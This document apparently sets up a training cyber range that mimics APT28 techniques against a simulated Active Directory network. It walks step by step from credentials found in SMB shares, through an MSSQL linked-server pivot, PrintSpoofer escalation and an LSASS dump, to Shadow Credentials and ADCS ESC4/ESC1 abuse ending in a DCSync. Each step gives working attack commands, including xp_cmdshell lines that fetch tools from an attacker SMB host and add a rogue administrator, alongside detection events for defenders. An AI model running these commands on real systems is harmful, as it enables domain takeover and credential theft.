# APT28 Operation IRON MERIDIAN — Active Directory Certificate Services Cyber Range

**Classification:** UNCLASSIFIED // EXERCISE ONLY
**Domain Theme:** Corporate Enterprise — Healthcare Organization AD + PKI Infrastructure
**Network:** cyberange.local (simulated)
**Platform:** Windows Server 2019 — OpenStack / QEMU-KVM

---

## Machine Summary

| # | Hostname | Role | Vulnerability | MITRE ATT&CK |
|---|----------|------|---------------|---------------|
| M1 | DC01 | Domain Controller (AD DS + DNS) | Shadow Credentials ACL (svc_app WriteProperty on svc_adm), weak password policy | T1552.001, T1556 |
| M2 | SRV01-WEB | IIS File Server | 15 SMB shares (11 anonymous), real creds buried in 40+ decoy files | T1083, T1552.001 |
| M3 | SRV02-DB | MSSQL Primary Database | svc_db has sysadmin, SQL Linked Server to SRV03-APP with RPC OUT, xp_cmdshell enabled | T1021, T1059.003 |
| M4 | SRV03-APP | MSSQL Application Server | Linked server target runs as svc_app (SeImpersonatePrivilege), LocalAccountTokenFilterPolicy=1 | T1134, T1003.001 |
| M5 | SRV04-CA | Enterprise Certificate Authority | ADCS ESC4 (svc_adm WriteDACL+WriteProperty on CorpAuth template) → ESC1 (Enrollee Supplies SAN) | T1649, T1558.004 |

---

## Credential Chain

```
M2 SMB Shares     →  svc_db : Db@ccess2025!  (buried in WebApps/archive/2024-Q3/corpapp.bak/web.config)
M3 SQL Login      →  svc_db authenticates to MSSQL  →  Linked Server pivot to SRV03-APP
M4 xp_cmdshell    →  PrintSpoofer (SeImpersonate)  →  SYSTEM  →  LSASS dump  →  svc_app NT hash
M1 Shadow Creds   →  svc_app WriteProperty on svc_adm msDS-KeyCredentialLink  →  certipy-ad shadow auto  →  svc_adm auth via PKINIT
M5 ESC4 → ESC1    →  svc_adm WriteDACL on CorpAuth template  →  enable SAN  →  request cert as Administrator  →  PKINIT  →  DCSync
```

---

## Attack Flow (5 Steps)

### Step 1 — SMB Share Maze: Credential Discovery (SRV01-WEB)

SRV01-WEB hosts 15 SMB shares. 11 are accessible anonymously, 4 require authentication. Across these shares are 40+ configuration files containing credentials — but only 2 contain real, working credentials for `svc_db`. The rest are decoys. The real credentials are buried deep in the directory structure.

**Real credential locations:**
- `WebApps/archive/2024-Q3/corpapp.bak/web.config` — connectionString with `svc_db:Db@ccess2025!`
- `Ops-Scripts/Database/Weekly_DB_Maintenance.ps1` — `$SqlPassword = "Db@ccess2025!"`

**Tools:** smbclient, nxc, smbmap
**Detection:** Event 5140 (network share access) and Event 5145 (detailed file share access) on SRV01-WEB in bulk. Unusual anonymous SMB enumeration pattern from single source IP.

```bash
# Enumerate shares
nxc smb <SRV01_IP> -u '' -p '' --shares
smbclient -N -L //<SRV01_IP>/

# Recursively list anonymous shares
smbclient -N '//<SRV01_IP>/WebApps' -c 'recurse ON; ls'

# Download the real config
smbclient -N '//<SRV01_IP>/WebApps' -c 'cd archive\2024-Q3\corpapp.bak; get web.config'
cat web.config | grep -i "password\|connectionstring"
# Output: svc_db / Db@ccess2025! / SRV02-DB

# Validate on MSSQL
impacket-mssqlclient 'cyberange.local/svc_db:Db@ccess2025!@SRV02-DB.cyberange.local' -windows-auth
```

---

### Step 2 — SQL Linked Server Pivot (SRV02-DB → SRV03-APP)

`svc_db` is sysadmin on SRV02-DB. A SQL Linked Server is configured from SRV02-DB to SRV03-APP, running in the security context of `svc_app`. RPC OUT is enabled, allowing `xp_cmdshell` execution on SRV03-APP through the linked server. The attacker connects to SRV02-DB, discovers the linked server, and pivots to SRV03-APP.

**Tools:** impacket-mssqlclient
**Detection:** SQL Server audit logs on SRV02-DB showing cross-server `EXEC AT` statements. Event 4688 on SRV03-APP showing cmd.exe spawned by sqlservr.exe.

```bash
# Connect to SRV02-DB as svc_db
impacket-mssqlclient 'cyberange.local/svc_db:Db@ccess2025!@SRV02-DB.cyberange.local' -windows-auth

# Inside SQL:
SELECT name, data_source FROM sys.servers WHERE is_linked = 1;
-- Shows: SRV03-APP linked server

# Execute commands on SRV03-APP through linked server
EXEC ('xp_cmdshell ''whoami''') AT [SRV03-APP];
-- Output: cyberange\svc_app

EXEC ('xp_cmdshell ''whoami /priv''') AT [SRV03-APP];
-- Shows: SeImpersonatePrivilege = Enabled
```

---

### Step 3 — PrintSpoofer Privilege Escalation + Credential Harvest (SRV03-APP)

`svc_app` has `SeImpersonatePrivilege` because it runs the SQL Server service. The attacker uploads `PrintSpoofer64.exe` via an authenticated SMB server on the attacker machine (Windows blocks anonymous SMB), then escalates to SYSTEM. As SYSTEM, a temporary local admin account is created, and LSASS is dumped to extract the `svc_app` NT hash.

**Tools:** impacket-smbserver, impacket-mssqlclient, PrintSpoofer64.exe, nxc (lsassy)
**Detection:** Event 4688 on SRV03-APP for PrintSpoofer, net.exe (user creation), and SMB client connections to attacker IP. Event 4720 (user account created). Event 4732 (member added to local group).

```bash
# Start authenticated SMB server on attacker
impacket-smbserver -smb2support -username att -password att share /opt/redteam/tools/ &

# From SQL linked server — upload PrintSpoofer
EXEC ('xp_cmdshell ''net use \\<ATTACKER_IP>\share /user:att att''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''copy \\<ATTACKER_IP>\share\PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe /Y''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''net use \\<ATTACKER_IP>\share /delete /y''') AT [SRV03-APP];

# Escalate to SYSTEM
EXEC ('xp_cmdshell ''C:\Windows\Temp\PrintSpoofer64.exe -i -c "net user tempadmin P@ss123! /add"''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''C:\Windows\Temp\PrintSpoofer64.exe -i -c "net localgroup Administrators tempadmin /add"''') AT [SRV03-APP];

# Dump LSASS from attacker via nxc
nxc smb SRV03-APP.cyberange.local -u tempadmin -p 'P@ss123!' --local-auth -M lsassy
# Output: svc_app NT hash
```

---

### Step 4 — Shadow Credentials: svc_app → svc_adm via PKINIT (DC01)

`svc_app` has `WriteProperty` on `svc_adm`'s `msDS-KeyCredentialLink` attribute in Active Directory. This allows a Shadow Credentials attack — the attacker writes a new key credential to `svc_adm`, then authenticates as `svc_adm` via Kerberos PKINIT using the corresponding private key. No password needed.

**Tools:** certipy-ad (shadow auto command)
**Detection:** Event 5136 on DC01 (DS object modification — msDS-KeyCredentialLink changed on svc_adm). Event 4768 with PKINIT pre-authentication type (certificate-based TGT). The key indicator is a certificate-based 4768 for an account that has never used PKINIT before.

```bash
# Shadow Credentials attack — writes key + authenticates in one step
certipy-ad shadow auto -u 'svc_app@cyberange.local' -hashes ':<SVC_APP_HASH>' -account svc_adm -dc-ip <DC_IP>

# If certipy returns a PFX:
certipy-ad auth -pfx svc_adm.pfx -dc-ip <DC_IP>
# Output: svc_adm TGT + NT hash via PKINIT

# If PKINIT fails (KDC cert not enrolled yet), use the hash directly
```

---

### Step 5 — ADCS ESC4 → ESC1: Certificate Template Abuse → Domain Admin (SRV04-CA)

`svc_adm` is a member of the `CertManagers` group and has `WriteProperty`, `WriteDACL`, and `WriteOwner` on the `CorpAuth` certificate template. This is ESC4 — the ability to modify template attributes. The attacker uses `certipy-ad template` to enable the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag (allows the requester to specify the Subject Alternative Name), converting the template from safe to ESC1-vulnerable. Then the attacker requests a certificate as `Administrator` using the SAN field, authenticates via PKINIT, and performs DCSync.

**Prerequisite setup on SRV04-CA:**
```powershell
certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service CertSvc
```

**Tools:** certipy-ad (template, req, auth commands), impacket-secretsdump
**Detection:** Event 4899/4900 on SRV04-CA (certificate template modification). Event 4887 (certificate request with SAN). Event 4768 with certificate pre-auth for Administrator. Event 4662 (DCSync replication on DC01).

```bash
# ESC4: Modify template to enable SAN (Enrollee Supplies Subject)
echo 'y' | certipy-ad template -u 'svc_adm@cyberange.local' -hashes ':<SVC_ADM_HASH>' \
  -template CorpAuth -write-default-configuration -dc-ip <DC_IP>

# ESC1: Request certificate as Administrator
yes | certipy-ad req -u 'svc_adm@cyberange.local' -hashes ':<SVC_ADM_HASH>' \
  -ca 'cyberange-CA' -template 'CorpAuth' -upn 'Administrator@cyberange.local' -dc-ip <DC_IP>

# PKINIT: Authenticate with the certificate
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
# Output: Administrator TGT + NT hash

# DCSync: Dump entire domain
impacket-secretsdump 'cyberange.local/Administrator@DC01.cyberange.local' -hashes ':<ADMIN_HASH>'
```

**Output:** Every domain credential — NTDS.dit contents including all user hashes, machine account hashes, and Kerberos keys. Full domain compromise.

---

## Setup Order

```
1. M1-DC01     — Domain Controller (creates forest, must be first)
2. M2-SRV01-WEB — Join domain, create SMB share maze
3. M3-SRV02-DB  — Join domain, install SQL Server, configure linked server
4. M4-SRV03-APP — Join domain, install SQL Server (svc_app), linked server target
5. M5-SRV04-CA  — Join domain, install ADCS Enterprise CA, configure CorpAuth template
6. M1-DC01 (again) — Run post-CA script: Shadow Credentials ACL + CertEnroll task
```

Per-machine:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

---

## OpenStack Network Assignment

All 5 machines on a single flat network. DC01 provides DNS.

| Machine | Network | Key Ports |
|---------|---------|-----------|
| DC01 | lab-net | 53, 88, 135, 389, 445, 5985 |
| SRV01-WEB | lab-net | 80, 445 (SMB shares) |
| SRV02-DB | lab-net | 1433 (MSSQL default instance) |
| SRV03-APP | lab-net | 1433, 445, 5985 |
| SRV04-CA | lab-net | 80 (CertSrv web enrollment), 135, 445 |

---

## APT28 Technique Mapping

This range is a subset of APT28 (Forest Blizzard / STRONTIUM) tradecraft. APT28 is attributed to Russia's GRU Unit 26165 and is known for:

- Large-scale credential harvesting from network resources (NSA/CISA joint advisory on GRU Kubernetes spray campaigns)
- SQL database exploitation for lateral movement
- Active Directory identity manipulation for persistent access
- Certificate-based authentication abuse for long-dwell operations

| Step | Technique | MITRE ID | APT28 Precedent |
|------|-----------|----------|-----------------|
| 1 | Credentials in Files | T1552.001 | Network share enumeration for credential harvesting |
| 2 | Remote Services: SQL | T1021 | Database exploitation for lateral movement |
| 3 | Access Token Manipulation | T1134 | SeImpersonatePrivilege abuse — token impersonation |
| 4 | Modify Authentication Process | T1556 | Shadow Credentials — identity manipulation without password change |
| 5 | Steal or Forge Certificates | T1649 | ADCS abuse — certificate-based domain takeover |

---

